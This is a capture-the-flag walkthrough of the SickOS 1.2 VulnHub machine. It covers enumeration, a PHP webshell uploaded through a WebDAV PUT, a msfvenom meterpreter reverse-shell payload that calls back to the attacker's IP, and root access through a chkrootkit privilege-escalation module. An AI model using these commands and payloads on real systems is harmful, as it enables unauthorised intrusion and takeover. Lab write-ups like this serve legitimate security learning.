---
layout: default
title : muzec - SickOS 1.2 Writeup
---

Description:-

This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.

Since it a OSCP like box we are taking it down today..... lol.

![image](https://user-images.githubusercontent.com/69868171/118409304-d2cd1e00-b657-11eb-8c10-dfec6d85f2b1.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/Sickos 2]
└─$ nmap -sC -sV -oA nmap 172.16.139.177 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 12:06 EDT
Nmap scan report for 172.16.139.177
Host is up (0.00052s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds
```

We have 2 open ports SSH and HTTP let hit port 80 first which is the HTTP port .

![image](https://user-images.githubusercontent.com/69868171/118409304-d2cd1e00-b657-11eb-8c10-dfec6d85f2b1.png)

We found a simpe web page so i try checking the source code first maybe a hint is left behind but nothing just a troll lol .

![image](https://user-images.githubusercontent.com/69868171/118409548-ee84f400-b658-11eb-9cc3-2d661ac74d6b.png)

Let hit directory burster which is our mighty gobuster lol .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/Sickos 2]
└─$ gobuster dir -u http://172.16.139.177/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.139.177/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2021/05/16 12:12:45 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 163]
/test                 (Status: 301) [Size: 0] [--> http://172.16.139.177/test/]
/%7Echeckout%7E       (Status: 403) [Size: 345]                                
                                                                               
===============================================================
2021/05/16 12:16:03 Finished
===============================================================
```

Cool let check `http://172.16.139.177/test` but nothing really in the dir i really spend sometime here .

![image](https://user-images.githubusercontent.com/69868171/118409888-9fd85980-b65a-11eb-8099-2f200f699f19.png)

So i decide to check for `HTTP-METHOD` with nmap since i got nothing really interesting in gobuster also i try running nikto but seriously nothing .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/Sickos 2]
└─$ nikto -h http://172.16.139.177/     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.139.177
+ Target Hostname:    172.16.139.177
+ Target Port:        80
+ Start Time:         2021-05-16 12:25:54 (GMT-4)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ 26545 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-05-16 12:26:32 (GMT-4) (38 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Now back to nmap scanning for HTTP-Method .

`nmap --script http-methods <target>`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/Sickos 2]
└─$ nmap --script http-methods 172.16.139.177 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 12:27 EDT
Nmap scan report for 172.16.139.177
Host is up (0.00038s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Nmap done: 1 IP address (1 host up) scanned in 19.09 seconds
```
Cool so i decide to scan the directory i found also with the nmap script .

`nmap --script http-methods --script-args http-methods.url-path='/website' <target>`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/Sickos 2]
└─$ nmap --script http-methods --script-args http-methods.url-path='/test' 172.16.139.177
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 12:31 EDT
Nmap scan report for 172.16.139.177
Host is up (0.00063s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-methods: 
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test

Nmap done: 1 IP address (1 host up) scanned in 18.26 seconds
```

Ahhhhh cool now it getting interesting as we can see, the method PUT is allowed on the URL meaning we can create a new file on the webserver like upload a webshell to get a reverse shell back to us let try that now.

`curl -v -X OPTIONS http://172.16.139.177/test`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/Sickos 2]
└─$ curl -v -X OPTIONS http://172.16.139.177/test  
*   Trying 172.16.139.177:80...
* Connected to 172.16.139.177 (172.16.139.177) port 80 (#0)
> OPTIONS /test HTTP/1.1
> Host: 172.16.139.177
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Location: http://172.16.139.177/test/
< Content-Length: 0
< Date: Sun, 16 May 2021 19:39:56 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 172.16.139.177 left intact
```

Now let upload a PHP code to get a command execution from the webserver yea running a system command you got it right .

`curl -v -X PUT -d '<?php system ($_GET['cmd']) ?>' http://172.16.139.177/test/cmd.php`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/Sickos 2]
└─$ curl -v -X PUT -d '<?php system ($_GET['cmd']) ?>' http://172.16.139.177/test/cmd.php
*   Trying 172.16.139.177:80...
* Connected to 172.16.139.177 (172.16.139.177) port 80 (#0)
> PUT /test/cmd.php HTTP/1.1
> Host: 172.16.139.177
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Length: 28
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 28 out of 28 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Sun, 16 May 2021 19:44:12 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 172.16.139.177 left intact
```
Now let check `http://172.16.139.177/test/` we can see we have sucessfully uploaded it cool right?? now let try to execute command .

`http://172.16.139.177/test/cmd.php?cmd=id` and boom it working .

![image](https://user-images.githubusercontent.com/69868171/118410536-e8454680-b65d-11eb-9007-05c9b0ff7114.png)

Now let try to get a shell back to us using msfvenom now .

`msfvenom -p php/meterpreter_reverse_tcp lhost=172.20.10.4 lport=443 -f raw > shell.php`

why do i use port 443 because most of the port on the machine is blocked and i think the only ports that give back reverse shell is port 443 and port 8080 now let upload the shell we just generated.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/Sickos 2]
└─$ curl -T shell.php http://172.16.139.177/test/shell.php
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>417 - Expectation Failed</title>
 </head>
 <body>
  <h1>417 - Expectation Failed</h1>
 </body>
</html>
```
Strange but i got failed so i try doing some research on it with no time i found the fix ahhh cool right .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/Sickos 2]
└─$ curl -T shell.php http://172.16.139.177/test/shell.php --http1.0
```
Now let check `http://172.16.139.177/test/` back to confirm if it uploaded .

![image](https://user-images.githubusercontent.com/69868171/118410909-dd8bb100-b65f-11eb-8d62-6901d63478bf.png)

And boom it uploaded now let start `msfconsole` and set it up to catch our shell .

1. use exploit/multi/handler
2. set payload php/meterpreter_reverse_tcp
3. set lhost Local-IP
4. set lport 443

![image](https://user-images.githubusercontent.com/69868171/118411014-820df300-b660-11eb-9ec9-ba2a24a942fd.png)

Now let click on exploit and back to the `http://172.16.139.177/test/` to click on the shell.php we just uploaded .

NOTE:- you need to run `msfconsole` with `sudo` or if you are in root you are good to go to run exploit.

![image](https://user-images.githubusercontent.com/69868171/118411144-1b3d0980-b661-11eb-9ab4-48adfac2a350.png)

Now let click the shell.php we uploaded .

![image](https://user-images.githubusercontent.com/69868171/118411174-3d368c00-b661-11eb-87df-76ada2ae91c4.png)

And boom we have shell smooth right?? lol .

### Privilege Escalation

Now let drop in a shell by typing `shell` and spawning a TTY shell with `python -c 'import pty; pty.spawn ("/bin/bash")'` and we are good to go cool .

![image](https://user-images.githubusercontent.com/69868171/118411374-352b1c00-b662-11eb-9655-8981ddbf2633.png)

So we only have one 2 users on the box root and john going through john home folder i found nothing also checking the tmp and opt folder everything seems empty.

![image](https://user-images.githubusercontent.com/69868171/118411483-d74b0400-b662-11eb-987d-efe47157e33f.png)

So i decided to check the crontab and guess what i found something interesting in the `/etc/cron.daily` .

![image](https://user-images.githubusercontent.com/69868171/118411619-66f0b280-b663-11eb-83c4-1cd134616ee0.png)

The `chkrootkit` so i check the version and check for some available exploit.

![image](https://user-images.githubusercontent.com/69868171/118411640-8687db00-b663-11eb-85d3-3a9d3eeaddf1.png)

Also found one for metasploit which is nice and easy for us to use now .

![image](https://user-images.githubusercontent.com/69868171/118411697-d6ff3880-b663-11eb-819b-89c0af03db4f.png)

 Chkrootkit before 0.50 will run any executable file named /tmp/update as root, allowing a trivial privilege escalation. WfsDelay is set to 24h, since this is how often a chkrootkit scan is scheduled by default. 
 
 ![image](https://user-images.githubusercontent.com/69868171/118411717-fbf3ab80-b663-11eb-9163-9618dcd00b87.png)

Now let background our shell to use the Chkrootkit Local Privilege Escalation module .

![image](https://user-images.githubusercontent.com/69868171/118411802-6efd2200-b664-11eb-9f49-1d4fb68dbe6a.png)

It should be like the image below .

![image](https://user-images.githubusercontent.com/69868171/118411816-86d4a600-b664-11eb-9363-b9650715fca4.png)

Now let run exploit and wait for it probably it will take some time .

![image](https://user-images.githubusercontent.com/69868171/118411875-d7e49a00-b664-11eb-9f63-3f15c12a92c2.png)

Boom we are root sweet now let get our flag in the root directory.

![image](https://user-images.githubusercontent.com/69868171/118412128-4bd37200-b666-11eb-887a-7e07c65de809.png)

Box rooted cool right?? .

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>


